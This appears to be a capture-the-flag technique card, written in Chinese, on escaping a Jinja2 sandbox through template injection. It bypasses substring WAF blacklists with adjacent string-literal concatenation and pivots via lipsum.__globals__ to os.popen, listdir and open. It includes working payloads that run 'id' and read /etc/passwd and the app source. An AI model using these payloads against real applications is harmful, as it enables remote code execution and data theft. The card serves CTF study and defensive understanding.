---
id: jinja2-sandbox-adjacent-string-literal-waf-bypass
name: Jinja2 沙箱 SSTI：相邻字符串字面量拼接绕过子串黑名单 + lipsum.__globals__ 跳板
description: WAF 对 URL 解码后原文做大小写敏感子串黑名单时，用 Python 相邻字符串字面量隐式拼接（'__glo''bals__'）让敏感名不出现在原文中；沙箱下 __subclasses__ 被削到只剩 Markup 时改走 lipsum['__globals__'] → __builtins__ → open。
tags: [web, harvested]
source: harvested
imported_at: 2026-11-27
---

# Jinja2 沙箱 SSTI：相邻字符串字面量拼接绕过子串黑名单 + lipsum.__globals__ 跳板

## 触发信号
- `{{7*7}}` → 49、`{{7*'7'}}` → 7777777（确认 Jinja2），但 `{{'class'}}`、`{{'flag'}}` 之类直接返回自定义拦截文案（如 `Get Out!Hacker!`）→ 存在子串黑名单 WAF。
- `{{''.__class__.__subclasses__()}}` 只返回 1 个类（如 `markupsafe.Markup`）→ 是 `SandboxedEnvironment`，`object.__subclasses__()` 被削窄，常规 `[N]` 找 `os._wrap_close` 的路线不通。
- `{{config}}` / `{{request}}` / `{{url_for}}` 回显空，但 `{{lipsum}}` / `{{cycler}}` / `{{joiner}}` / `{{namespace}}` 仍返回对象 → 沙箱只移除了部分全局，内置全局是跳板。

## 步骤
1. **先摸清黑名单形状**（逐词二分，别猜）：把候选词单独放进 `{{'xxx'}}` 批量发，看是回显还是拦截文案。同时验证：
   - 大小写敏感？`{{'CLASS'}}` 通过而 `{{'class'}}` 被拦 → 大小写敏感子串匹配。
   - 是否在 URL 解码后匹配？`%63lass` / `cla%73s` 仍被拦 → 编码绕过无效，别浪费时间。
   - `+`、`~`、空格、`"`、`|attr` 是否被拦（常见一并 ban 掉，导致 `'cla'+'ss'`、`'cla'~'ss'` 也失败）。
2. **核心绕过：相邻字符串字面量隐式拼接**。Python 里 `'__glo''bals__'` 求值为 `__globals__`，而原始 URL 中不含 `globals` 子串，正则/子串检查直接放行。同理 `'/fla''g_xxx'` 绕过 `flag`、`'po''pen'` 绕过 `popen`、`'__bui''ltins__'` 绕过 `builtins`、`'__imp''ort__'` 绕过 `import`。
   - 注意 `init` 被 ban 时 `['__init__']` 整条链会挂，改用不需要 `__init__` 的对象（函数对象本身就有 `__globals__`）。
3. **用 `[]` 下标访问替代点号与 `|attr`**：`lipsum['__glo''bals__']` 等价 `lipsum.__globals__`，且 `[` `]` 通常不在黑名单。
4. **沙箱跳板链**（`lipsum` 是 `jinja2.utils.generate_lorem_ipsum`，其 `__globals__` 是 `jinja2.utils` 模块字典，`is_safe_attribute` 未拦 `__globals__`）：
   ```
   {{lipsum['__glo''bals__']['__bui''ltins__']['__imp''ort__']('o''s')['list''dir']('/')}}
   {{lipsum['__glo''bals__']['__bui''ltins__']['open']('/etc/passwd')['read']()}}
   ```
   拿到 `os` 后 `listdir('/')` 定位 flag 文件名，再用 `open(...)['read']()` 读（`cat` 常被 ban，`open().read()` 更稳）。
5. **读源码反推黑名单**：`open('/proc/self/cwd/app.py')['read']()`（或 `/proc/self/cmdline` 找 cwd）直接看 WAF 正则，比逐词猜快得多。注意 `/proc/self/environ` 可能因含 `env` 子串被 WAF 拦。

## 证据
- `{{'cla''ss'}}` → 回显 `class`；`{{'cla'+'ss'}}` / `{{'cla'~'ss'}}` → 拦截文案（`+`/`~` 被 ban）。
- `{{lipsum['__glo''bals__']}}` → 打印出 `{'__name__': 'jinja2.utils', ...}` 完整字典。
- `{{lipsum['__glo''bals__']['__bui''ltins__']['__imp''ort__']('o''s')['po''pen']('id')['re''ad']()}}` → `uid=33(www-data)`。
- `{{''['__cla''ss__']['__subcla''sses__']()}}` → `[<class 'markupsafe.Markup'>]`（证明沙箱削窄，subclasses 路线死）。

## 坑
- **`+`/`~` 拼接常与关键字一起被 ban**，别默认字符串拼接可用；相邻字面量隐式拼接不引入任何新字符，是最稳的。
- **过滤在 URL 解码之后**：`%63`、`%73` 之类百分号编码完全无效，先验证再决定。
- **`__subclasses__()` 只剩一个类时不要硬找下标**，直接换 `lipsum`/`cycler`/`joiner` 的 `__globals__` 路线。
- **`popen('ls /')` 可能被拦而 `popen` 本身可用**：拦截的是参数里的子串（如 `ls /` 里的空格或 `/`），改用 `listdir` + `open().read()` 完全避开 shell。
- **flag 文件名含 `flag` 关键字**：路径也要用 `'/fla''g_xxx'` 拼接，否则读文件那一步被 WAF 拦。
- 500 错误页是标准 Werkzeug 页、无 traceback，别指望报错泄露；用 `open()` 读源码代替。
